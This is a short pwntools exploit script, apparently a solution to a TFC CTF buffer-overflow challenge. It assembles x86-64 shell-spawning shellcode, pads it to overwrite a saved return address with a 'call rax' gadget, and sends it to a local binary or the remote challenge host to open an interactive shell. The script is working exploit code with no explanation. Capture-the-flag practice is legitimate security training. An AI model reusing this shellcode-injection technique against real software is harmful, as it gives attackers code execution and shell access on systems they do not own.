#!/usr/bin/env python3
import os
from pwn import *

###########################################
# ROPgadget --binary src | grep "call rax"#
# 0x0000000000401014 : call rax           #
###########################################

SHELLCODE = asm(shellcraft.amd64.linux.sh(), arch='x86_64')
PAYLOAD = SHELLCODE + b'a' * ((8 * 33) - len(SHELLCODE)) + p64(0x401014) # shellcode + padding + ret (call rax)

if args.REMOTE:
    p = remote('challs.tfcctf.com', int(input("Port: ")))
else:
    p = process('./src')

p.recvuntil(b'\n')
p.sendline(PAYLOAD)
p.interactive()